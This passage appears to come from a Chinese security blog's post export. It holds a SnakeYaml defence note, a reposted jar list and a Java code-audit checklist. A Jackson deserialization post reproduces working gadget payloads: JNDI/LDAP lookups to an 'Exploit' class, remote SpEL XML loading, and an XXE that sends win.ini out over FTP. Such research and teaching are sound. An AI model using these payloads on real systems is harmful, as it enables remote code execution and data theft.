(org.eclipse.jetty.plus.jndi)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructSequenceStep2:376, BaseConstructor (org.yaml.snakeyaml.constructor)constructSequence:360, BaseConstructor (org.yaml.snakeyaml.constructor)construct:499, SafeConstructor$ConstructYamlSeq (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:525, Yaml (org.yaml.snakeyaml)load:453, Yaml (org.yaml.snakeyaml)main:10, Test 0x04 检测与防御检测方法排查服务端环境是否使用了SnakeYaml，若使用了则全局搜索关键字yaml.load(，若存在该关键字则需要进一步排查参数是否外部可控。 防御方法 禁止Yaml.load()函数参数外部可控； 若业务确实需要反序列化，则需严格过滤该参数内容，使用SafeConstructor对反序列化的内容进行限制或使用白名单控制反序列化的类的白名单； 在snakeyaml-1.25-sources.jar!/org/yaml/snakeyaml/constructor/SafeConstructor.java中看到，其构造函数就自定义了反序列化的类的白名单： 123456789101112131415161718public SafeConstructor() &#123; this.yamlConstructors.put(Tag.NULL, new ConstructYamlNull()); this.yamlConstructors.put(Tag.BOOL, new ConstructYamlBool()); this.yamlConstructors.put(Tag.INT, new ConstructYamlInt()); this.yamlConstructors.put(Tag.FLOAT, new ConstructYamlFloat()); this.yamlConstructors.put(Tag.BINARY, new ConstructYamlBinary()); this.yamlConstructors.put(Tag.TIMESTAMP, new ConstructYamlTimestamp()); this.yamlConstructors.put(Tag.OMAP, new ConstructYamlOmap()); this.yamlConstructors.put(Tag.PAIRS, new ConstructYamlPairs()); this.yamlConstructors.put(Tag.SET, new ConstructYamlSet()); this.yamlConstructors.put(Tag.STR, new ConstructYamlStr()); this.yamlConstructors.put(Tag.SEQ, new ConstructYamlSeq()); this.yamlConstructors.put(Tag.MAP, new ConstructYamlMap()); this.yamlConstructors.put(null, undefinedConstructor); this.yamlClassConstructors.put(NodeId.scalar, undefinedConstructor); this.yamlClassConstructors.put(NodeId.sequence, undefinedConstructor); this.yamlClassConstructors.put(NodeId.mapping, undefinedConstructor);&#125; 0x05 参考Java反序列化备忘录 yaml.load()反序列化漏洞测试","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"（转）Java项目中常见jar包的说明","date":"2019-11-25T15:33:03.000Z","path":"2019/11/25/（转）Java项目中常见jar包的说明/","text":"转自：https://blog.csdn.net/superdog007/article/details/50697831 Jar包 作用 axis.jar SOAP引擎包 commons-discovery-0.2.jar 用来发现、查找和实现可插入式接口，提供一些一般类实例化、单件的生命周期管理的常用方法. jaxrpc.jar Axis运行所需要的组件包 saaj.jar 创建到端点的点到点连接的方法、创建并处理SOAP消息和附件的方法，以及接收和处理SOAP错误的方法. wsdl4j-1.5.1.jar Axis运行所需要的组件包 activation.jar JAF框架的jar包 annotations-api.jar 使用注解所需jar ant.jar 用于自动化调用程序完成项目的编译，打包，测试等 aopalliance-1.0.jar 支持Spring asm-2.2.3.jar ASM字节码库 asm-commons-2.2.3.jar ASM字节码库 asm-util-2.2.3.jar Java字节码操纵和分析框架 aspectjrt.jar 处理事务和AOP所需的包 aspectjweaver.jar 处理事务和AOP所需的包 axiom-api-1.2.7.jar Axis axiom-impl-1.2.7.jar Axis bcprov-jdk15-140.jar 基于java1.5 bfmclientmodel.jar 使用WebSphere所需jar包 bpcclientcore.jar 使用WebSphere所需jar包 bpe137650.jar 提供远程访问BPE容器的实现。 bsh-2.0b4.jar 解决负载逻辑运算 c3p0-0.9.0.jar 开放源代码的JDBC连接池 cglib-nodep-2.1_3.jar Spring中自动代理所需jar包 cobertura.jar 测量测试覆盖率 commons-beanutils-1.7.0.jar 动态的获取/设值Java commons-chain-1.1.jar 实现责任链设计模式的Java commons-codec-1.3.jar 用来处理常用的编码方法的工具类包，例如DES、SHA1、MD5、Base64等等 commons-collections-3.1.jar 对标准java commons-collections.jar 对标准java commons-digester-1.8.jar 用于处理struts-config.xml配置文件 commons-fileupload-1.1.1.jar struts上传文件 commons-httpclient-3.1.jar 用来简化HTTP客户端与服务器端进行各种通信编程实现 commons-io-1.1.jar 针对java.io.InputStream和Reader进行了扩展 commons-lang-2.4.jar 对java.lang.*的扩展 commons-logging-1.1.1.jar 日志包 commons-pool-1.3.jar 实现对象池化框架 commons-validator-1.3.1.jar 用来把验证规则程序提取出来，以供重复使用 db2jcc.jar java连接DB2所需jar db2jcc_license_cu.jar java连接DB2所需jar dom4j-1.6.1.jar 解析XML ehcache-1.2.4.jar hibernate的二级缓存如果用ehcache的时候需要此jar包 emf.jar 基于Eclipse的模型框架 ezmorph-1.0.6.jar 使用JSON所需的jar包 FastInfoset-1.2.2.jar 使用WebService所需的jar包 freemarker-2.3.8.jar Strus2支持的一种表现层框架 geronimo-activation_1.1_spec-1.0.2.jar Apache geronimo-annotation_1.0_spec-1.1.1.jar Apache geronimo-javamail_1.4_spec-1.3.jar Apache geronimo-jaxws_2.1_spec-1.0.jar Apache geronimo-jms_1.1_spec-1.1.1.jar Apache geronimo-servlet_2.5_spec-1.2.jar Apache geronimo-stax-api_1.0_spec-1.0.1.jar Apache hibernate3.jar Hibernate3的核心jar包 htmclientmodel.jar 使用WebSphere所需jar包 jakarta-oro.jar 一套文本处理工具，提供per15.0兼容的表达式，AWK-like表达式，Glob表达式。 javassist.jar Javassist jaxb-api-2.1.jar 使用WebService所需的jar包 jaxb-impl-2.1.7.jar 使用CXF所需jar包 jaxb-xjc-2.1.7.jar 使用CXF所需jar包 jaxen-1.1.1.jar 解析XML jcifs-1.2.22.jar 实现单点登陆 jdom2-1.0.jar 解析XML jdom-1.0.jar 解析XML jettison-1.0.1.jar 使用CXF所需jar包 jetty-6.1.9.jar Jetty jetty-util-6.1.9.jar Jetty jra-1.0-alpha-4.jar 使用CXF所需jar包 js-1.6R7.jar 使用CXF所需jar包 json-lib-2.2.3-jdk13.jar 使用JSON所需的jar包 jsonplugin-0.25.jar strus2的JSON插件 jsr311-api-0.8.jar 使用CXF所需jar包 jstl.jar JSTL标签库 jta.jar 标准的 junit.jar 用于单元测试 jxl.jar 通过java操作excel表格的工具类库 ldap.jar JNDI目录服务和LDAO服务器所需的jar ldapbp.jar JNDI目录服务和LDAO服务器所需的jar log4j-1.2.15.jar 提供日志功能 mail.jar java发送邮件jar包 neethi-2.0.4.jar 使用CXF所需jar包 odmg-3.0.jar ODMG是一个ORM的规范，Hibernate实现了ODMG规范，这是一个核心的库 gnl-2.6.11.jar struts2中OGNL语言 ojdbc14.jar Oracle数据库驱动包 opensaml-1.1.jar 使用CXF所需jar包 oro-2.0.8.jar Validator框架所需的jar包 oscache-2.1.jar Java poi-3.1-FINAL-20080629.jar 操作exce所需jar包 poi-contrib-3.1-FINAL-20080629.jar 操作exce所需jar包 poi-ooxml-3.6-20091214.jar 提供对office的word、excel、visio及ppt的操作 poi-ooxml-schemas-3.6-20091214.jar 提供对office的word、excel、visio及ppt的操作 poi-scratchpad-3.1-FINAL-20080629.jar 提供对office的word、excel、visio及ppt的操作 processCommon.jar IBM ProcessCommonLibrary.jar IBM processIdentity.jar IBM ProcessInformation.jar 进程监视软件包 proxool-0.9.1.jar 数据库连接池 proxool-cglib.jar 数据库连接池 quartz-1.6.0.jar 开源作业调度框架 saaj-api-1.3.jar 使用axis所需的jar saaj-impl-1.3.2.jar 使用axis所需的jar serializer-2.7.1.jar XML序列化 slf4j-jdk14-1.5.6.jar 整合各种日志框架的工具 spring208.jar spring核心框架 spring-ldap-1.2-RC1.jar spring下LDAP spring-mock.jar spring的测试框架 standard.jar 使用JSTL标签库所需的jar stax-api-1.0.1.jar 解析XML struts2-core-2.0.14.jar struts2核心jar struts2-spring-plugin-2.0.6.jar struts2整合Spring所需jar taglibs-datetime.jar Apache开源组织提供标签库，用于格式化日期。 taglibs-mailer.jar 用于发送邮件 taglibs-string.jar Apache开源组织提供标签库，用于对String的操作。 task137650.jar Portal技术在SOA系统集成应用中实现所需的jar utility.jar Apache开源组织提供标签库 velocity-1.5.jar 一个免费的开源模板框架 wsdl4j-1.6.2.jar 用来解析服务的WSDl文件 wss4j-1.5.4.jar 创建CXF所需jar wss4j-1.5.4.jar 创建CXF所需jar wstx-asl-3.2.6.jar 创建CXF所需jar xbean-spring-2.8.jar 使用xfire所需jar xerces-2.6.2.jar XML解析器 xfire-all-1.2.6.jar 用于实现WebService XmlSchema-1.1.jar 使用xfire所需jar xwork-2.0.7.jar WebWork核心jar","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"（转）Java代码审计指南","date":"2019-11-25T14:20:15.000Z","path":"2019/11/25/（转）Java代码审计指南/","text":"转自：http://blog.nsfocus.net/code-audit-instruction/ 一、测试工具1.1 反编译java类如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译 选择class文件或者jar包，点击打开按钮，即可查看反汇编后的java源代码 1.2 Eclipse环境审计使用Eclipse的Import功能将程序代码导入workspace，打开任一java源文件，选择Source Analyse菜单下的条目进行关键方法搜索，搜索结果在窗口下面显示，然后进行人工分析。 二、认证管理2.1 图形验证码 用户登录过程是否有图形验证码保护，防止自动化程序猜测密码 验证码复杂度是否符合要求（干扰、变形） 验证码在使用过一次后是否会自动刷新 验证码明文是否会被传送给客户端（页面或Cookie） 验证码是否在被保护的操作进行前来验证（无验证或无效验证） 2.2 认证实现 用户认证过程中，用户名和密码合法性的检查方式是否符合要求 较安全的做法为先校验验证码，再检查用户名，最后比对密码的密文 是否具备用户注销功能 用户注销时是否清理了当前用户会话 是否会将密码作为重定向的一部分进行传送 在统一认证SSO模式下，有的实现并非使用Token来交换认证信息，而是通过客户端直接传递账号、密码，这种情形下有可能在URL中直接传递明文密码。 认证过程中对于用户名错误和密码错误提示是否相同 统一用户名和密码错误提示，可以降低账号、密码被猜解的风险 检查用户认证页面是否对认证失败的次数进行了限制 三、授权管理3.1 授权实现 应用的用户是否具有角色的区分 明确用户的角色定义、授权访问的范围，分析哪种情况下可能会导致越权 应用是否具备统一的（或独立）的权限控制模块 大部分的大型应用都会采用统一的权限控制模块 应用的权限控制模块是否存在漏洞 页面/功能是否使用了权限控制（模块） 识别出需要和无需权限控制的页面/功能，逐一进行验证。验证过程中需要考虑到用户的角色划分。 页面的权限控制是否正确 部分应用的权限控制（模块）的使用上存在缺陷，攻击者可能通过一些隐蔽的途径绕过鉴权，访问非授权资源 3.2 授权管理 高权限用户分析 分析系统高权限用户（例如：管理员用户）的分配情况及密码复杂度等 默认用户分析 分析系统是否存在默认用户、密码，密码复杂度等。 四、输入/输出验证4.1 SQL注入防护 是否存在全局过滤器 过滤器配置、过滤函数等 过滤器是否可以过滤所有查询请求 请求是否都按要求经过过滤器处理 过滤器的过滤是否符合要求 初期检查可以依据PHPIDS的规则库，后期根据收集的情况予以补充 是否使用了预查询机制 预查询是指在将数据传入SQL语句前明确指定传输数据的类型，以执行必要的转换。在Java中预查询的调用方式为prepareStatement。 是否存在SQL语句拼接 某些特殊的查询（特别复杂的组合查询）难免用到SQL语句拼接，遇到这种情况，就需要检查拼接是否有可能导致注入。 4.2 跨站攻击防护 是否存在全局XSS过滤器(论坛的过滤库) 过滤器的过滤是否符合要求 是否存在需过滤和不需过滤两种输出，页面是否控制恰当（*） 某些情况下可能存在两种输出，文本输出和富文本（HTML）输出，要强制文本输出，只需要调用HTMLEncode()对内容进行编码后输出即可；但是富文本本身就需要使用html来进行格式的控制，简单的编码就无法使用，这时需要在此类内容从客户端输入（用户提交）或输出给客户端（显示）时进行危险代码过滤。 输出的时候是否进行编码（HTML、JS） 4.3 CSRF攻击防护 Web表单是否使用了Token（或验证码） Web表单提交（成功或不成功）后token（或验证码）是否重置 检查Token的生成算法是否安全 可以从测试环境来检查生成的验证码是否符合复杂性要求，如是否有干扰线/点、字符变形等。 检查服务器获取Web表单参数值的方式 如果在操作时不严格区分GET和POST，在没有Token（或验证码）的辅助下很容易导致CSRF的发生。 4.4 文件上传防护 是否限制了上传文件的扩展名 以白名单形式指定允许上传的扩展名；以黑名单形式指定禁止上传的文件名 是否对上传文件进行了重命名操作 重命名操作是否安全，防止重命名过程中产生二次风险 是否对上传文件的存放位置禁止了脚本执行 4.5 文件下载防护 是否存在客户端指定文件名的下载功能 直接指定文件名的下载是否允许客户端指定路径 对于不同用户的文件在下载时是否进行了权限控制 文件下载功能中是否对用户的权限进行了检查。 4.6 重定向与转发保护 是否具有客户端控制的重定向或转发 是否定义了重定向的信任域名或主机列表 是否对客户端的重定向或转发请求进行检查 五、会话管理5.1 Session管理 session信息是否放在url里面 通过应用服务器的配置检查 执行业务功能时，是否检查了当前用户session身份 从代码部分、从配置部分检查，需要根据应用实际使用的验证方式 成功登陆之后是否会更新SessionID 认证成功后是否强制刷新用户使用的SessionID session是否有超时注销功能 检查Session的超时时间设置是否符合要求，默认是20~30分钟 5.2 Cookie管理 是否会在Cookie中存储明文或简单编码/加密过的密码 是否会在Cookie中存储应用的特权标识 是否设置了Cookie的有效域和有效路径 是否设置了合适的Cookie有效时间 如果生存时间在20~30分钟左右，使用Session方式会更加安全 六、密码管理6.1 加密安全 密码是否以不可逆的哈希形态存储 是否使用不带salt的哈希算法来加密密码 加密哈希算法中的salt是否硬编码在代码中 6.2 密码安全 认证过程中传输的密码是否进行了加密处理 可以采用哈希算法或者RSA等加密算法将密码加密后传递，或者是使用SSL来做传输层加密。 修改密码功能是否进行了旧密码的验证或者是安全问题的确认 找回密码功能是否借用第三方途径 第三方途径主要有电子邮件、手机短信等。这些途径应该是找回密码前预留的。 找回密码功能是否采用验证码确认并重设机制 部分应用的找回密码功能是直接将原密码发送到密码保护邮箱，这种方式存在一定的安全风险。 检查密码设置页面是否对密码复杂度进行检查 至少包含数字和字母，长度最少6位，避免用户输入弱口令 七、调试&amp;接口7.1 异常处理 是否捕获了应用出现的错误并阻止其输出给客户端 详细的错误输出可能会导致SQL查询泄露、程序源代码泄露、物理路径泄露等。 异常处理是否能够全面覆盖所有异常行为 异常处理是否会导致程序流程异常，引发安全问题 备注：某些异常可能是致命的，但是如果程序捕获了异常，可能会导致程序绕过一些重要的步骤而直接执行后续的操作。 7.2 数据接口 接口服务是否存在安全漏洞 接口服务后台登录是否存在弱密码 例如：axis2，http://localhost:8080/axis2/axis2-admin/，默认用户名/密码：admin/axis2，密码在webapps\\axis2\\WEB-INF\\conf\\axis2.xml里配置 接口服务是否有默认的测试页面 例如：axis2，http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径 接口服务应用是否包含身份认证，认证的帐号、密码（或密钥）的存储安全 例如：使用WSS4J对SOAP报文体进行身份认证 接口服务应用传输是否加密 例如：使用WSS4J对SOAP报文体进行加密 接口服务应用异常处理 例如：Webservice应用对特殊字符的处理，是否会在报错信息中泄露数据，参考http://www.soapui.org/About-SoapUI/features.html#security-testing 7.3 硬编码 代码中是否存在内置的敏感信息 如：调试帐号、外部接口帐号/密码、数据加/解密密钥等 八、日志审计8.1 日志记录 应用是否会将用户密码记入日志 日志记录的内容是否合理，避免日志文件增长过快，造成磁盘空间不足 九、运行环境9.1 应用配置 是否删除了不必要的网页、帐号及权限 页面包括应用服务器的默认页面、管理后台、测试页面、备份文件等；帐号指Web应用服务器的运行帐户 目录浏览是否被禁用 Web容器默认帐户的密码是否更改或禁用 不能删除的管理后台是否启用了密码保护 正式发布的应用是否包含开发调试文件、代码 如SVN版本信息文件、调试工具/页面、功能模块中的调试接口等 重要的配置信息是否进行了加密 如数据库连接配置、其它接口连接配置等 9.2 自定义错误 是否自定义了403、404、500错误页面 错误页面是否会输出详细错误信息 9.3 日志管理 服务器是否开启了用户访问日志的记录 记录的日志是否满足问题回溯的要求 是否记录了客户端地址、请求的方法、请求的URL、提交的参数（GET、POST、COOKIE参数）、请求的状态等 十、第三方组件分析应用使用的框架及引用的第三方组件，分析其是否存在各种已知漏洞，且当前环境漏洞是否可以重现 10.1 框架 Struts/Struts 2 Turbine Spring MVC Hibernate iBatis DotNetNuke 10.2 编辑器 CKEditor/FCKEditor eWebeditor NicEdit Free Rich Text Editor 10.3 上传组件 SmartUpload 10.4 安全功能十一、安全功能对于比较重要的业务系统，例如：支付系统，可以参考以下条目，进行检测 11.1 登录认证 重要系统是否使用了双因素登录认证，例如：数字证书，支付盾，密保卡等，防止用户密码泄露导致系统被非法登录 重要系统是否使用了安全控件，对用户提交的关键数据进行加密 重要系统的后台管理界面是否限制了访问源地址 系统的密码重置等短信发送等功能的使用频率是否进行了限制，例如：一个手机号一分钟只能发送一条短信，防止被恶意利用多次发送短信 用户登录时的用户名，状态，源地址等关键信息需要记录到应用日志中，管理员可以进行查询 如果用户在不常用的地址登录，系统会提示用户，并显示上一次登录的源地址 对于多次密码错误的登录尝试，系统能否检测，禁止源地址访问10分钟，管理员登录后可以看到，也可以进行查询 11.2 数据操作 系统中大数据量查询等影响系统负载的功能是否进行了查询范围限制，例如：只能查询最近3个月的数据 系统中大数据量查询等影响系统负载的功能是否进行了查询频率限制，例如：一分钟内只能查询一次 高可用性要求的系统中是否有用户请求频率检测，超过访问阈值时，需要用户输入页面上的图形验证码，才能进一步操作 对报表查询等涉及大量数据的读取和导出操作，是否严格限制了查询范围，必要时可以使用双用户认证，限制单个用户大量读取业务数据的能力 业务关键数据的读取页面，是否使用静态密码、手机动态密码等二次验证，防止敏感数据泄露，例如：交易详单的查询 业务处理过程中用户身份等关键识别信息，是否保存在服务端，禁止从客户端提交 业务处理过程中关键操作需要用户确认和图形验证码，手机动态验证码等保护，防止重放攻击，例如：转账操作等 关键业务操作需要记录到应用日志中，可以设置阈值，超过系统会告警，管理员可以进行查询。例如：转账金额大于20万的交易记录 涉及资金的业务用户可以设置上限，例如：用户可以设置每日最高消费限额，并在转账 关键业务操作可以设置短信提醒，例如：用户进行资金转账，进行详单查询等","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Jackson系列七——其他Gadgets与检测防御","date":"2019-11-24T10:17:15.000Z","path":"2019/11/24/Jackson系列七——其他Gadgets/","text":"反序列化漏洞的利用链实在是太多了，前面都是挑了一些特别点的利用链进行了复现和调试分析，具体还有哪些以及所适用的版本看下Jackson的黑名单的设置就知道了。 0x01 基于FileSystemXmlApplicationContext的利用链复现利用和之前分析的ClassPathXmlApplicationContext类出自同一个包，一模一样的环境，只需要换下利用类为org.springframework.context.support.FileSystemXmlApplicationContext即可成功触发： 1String payload = \"[\\\"org.springframework.context.support.FileSystemXmlApplicationContext\\\", \\\"http://127.0.0.1/spel.xml\\\"]\"; FileSystemXmlApplicationContext类的漏洞原理和ClassPathXmlApplicationContext类是一样的，同样是没有setter方法，只有构造函数，而该函数中的refresh()函数存在SpEL注入漏洞。 调试分析和前面CVE-2017-17485的一样，只不过换了个同一个包下的不同类而已，具体的参考之前的调试分析即可。 函数调用栈如下： 123456789101112131415161718192021222324252627282930evaluate:163, StandardBeanExpressionResolver (org.springframework.context.expression)evaluateBeanDefinitionString:1452, AbstractBeanFactory (org.springframework.beans.factory.support)doResolveBeanClass:1409, AbstractBeanFactory (org.springframework.beans.factory.support)resolveBeanClass:1372, AbstractBeanFactory (org.springframework.beans.factory.support)determineTargetType:670, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)predictBeanType:637, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)isFactoryBean:1489, AbstractBeanFactory (org.springframework.beans.factory.support)doGetBeanNamesForType:421, DefaultListableBeanFactory (org.springframework.beans.factory.support)getBeanNamesForType:391, DefaultListableBeanFactory (org.springframework.beans.factory.support)registerBeanPostProcessors:189, PostProcessorRegistrationDelegate (org.springframework.context.support)registerBeanPostProcessors:709, AbstractApplicationContext (org.springframework.context.support)refresh:534, AbstractApplicationContext (org.springframework.context.support)&lt;init&gt;:142, FileSystemXmlApplicationContext (org.springframework.context.support)&lt;init&gt;:85, FileSystemXmlApplicationContext (org.springframework.context.support)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:11, PoC 0x02 基于JdbcRowSetImpl的利用链复现利用和Fastjson反序列化漏洞中的利用是一样的原理，都是利用JNDI注入漏洞实现反序列化漏洞的利用，不再多说，需要实现RMI服务或LDAP服务，注意JDK版本限制等： 1String payload = \"[\\\"com.sun.rowset.JdbcRowSetImpl\\\", &#123;\\\"dataSourceName\\\":\\\"ldap://localhost:1389/Exploit\\\", \\\"autoCommit\\\":true&#125;]\"; 调试分析参考Fastjson反序列化漏洞对应的调试分析即可。 利用链：setDataSourceName()-&gt;..-&gt;setAutoCommit()-&gt;connect()-&gt;IntialContext.lookup() 函数调用栈如下： 1234567891011121314151617lookup:417, InitialContext (javax.naming)connect:624, JdbcRowSetImpl (com.sun.rowset)setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:11, PoC 0x03 基于C3P0 JndiRefForwardingDataSource的利用链复现利用需要开启RMI服务或LDAP服务，另外还需要c3p0-0.9.5.2，mchange-commons-java-0.2.15等jar包： 1String payload = \"[\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\", &#123;\\\"jndiName\\\":\\\"ldap://localhost:1389/Exploit\\\", \\\"loginTimeout\\\":0&#125;]\"; 调试分析看到PoC中设置了两个属性值jndiName和loginTimeout。 我们调试的时候直接往com.mchange.v2.c3p0.JndiRefForwardingDataSource类的setLoginTimeout()及其父类JndiRefDataSourceBase.setJndiName()上打上断点。 前面的解析和反序列化过程跟之前的调试分析是一样的，调用deserializeAndSet()函数，再在其中调用_setter.invoke()实现反射调用目标类属性的setter方法。这里是先调用JndiRefDataSourceBase.setJndiName()设置jndiName属性值为我们的恶意LDAP服务地址： 往下调试，接着调用JndiRefForwardingDataSource.setLoginTimeout()函数设置loginTimeout属性值，可以看到先调用了inner()方法： 跟进inner()方法，由于inner并未有缓存即cachedInner为空，所以会往下执行调用dereference()函数： 在dereference()函数中，就是典型的JNDI注入漏洞了，其中lookup()函数的参数就是前面调用setJndiName()设置的属性值： 往下就是JNDI注入的过程了。 此时函数调用栈如下： 12345678910111213141516171819202122232425262728293031&lt;init&gt;:2, ExploitnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)newInstance:442, Class (java.lang)getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)getObjectInstance:189, DirectoryManager (javax.naming.spi)c_lookup:1085, LdapCtx (com.sun.jndi.ldap)p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:417, InitialContext (javax.naming)dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0)inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0)setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:11, PoC 0x04 基于XPathParser的利用链复现利用需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。 和《Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）》类似，只不过注入的XXE payload直接写在JSON数组中： 1String payload = \"[\\\"org.apache.ibatis.parsing.XPathParser\\\", \\\"&lt;!DOCTYPE ANY[\\\\n&lt;!ENTITY % file SYSTEM 'file:///c:/windows/win.ini'&gt;\\\\n&lt;!ENTITY % remote SYSTEM 'http://127.0.0.1/xxe/evil.dtd'&gt;\\\\n%remote;\\\\n%send;\\\\n]&gt;\\\"]\"; evil.dtd： 1&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; %all; 开启Web服务放置exp.xml和evil.dtd，再开启FTP服务进行监听接受数据： 调试分析在调用newInstance()函数的时候，会新建一个XPathParser类对象，同时会调用该类的构造函数： 其中会调用createDocument()函数，其中直接调用DocumentBuilder.parse()而未调用setFeature()设置禁用的解析类型，并且参数是我们外部可控的XML内容，因此妥妥的XXE： 函数调用栈如下： 12345678910111213141516171819parse:339, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)createDocument:257, XPathParser (org.apache.ibatis.parsing)&lt;init&gt;:55, XPathParser (org.apache.ibatis.parsing)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:11, PoC 0x05 更多的一些Gadgets收集的一些利用链payload，具体环境和原理可自行搭建调试分析： 1234567891011[&quot;org.springframework.context.support.GenericGroovyApplicationContext&quot;, &quot;http://127.0.0.1:8000/spel.xml&quot;] [&quot;org.apache.openjpa.ee.RegistryManagedRuntime&quot;, &#123;&quot;registryName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;rollbackOnly&quot;: 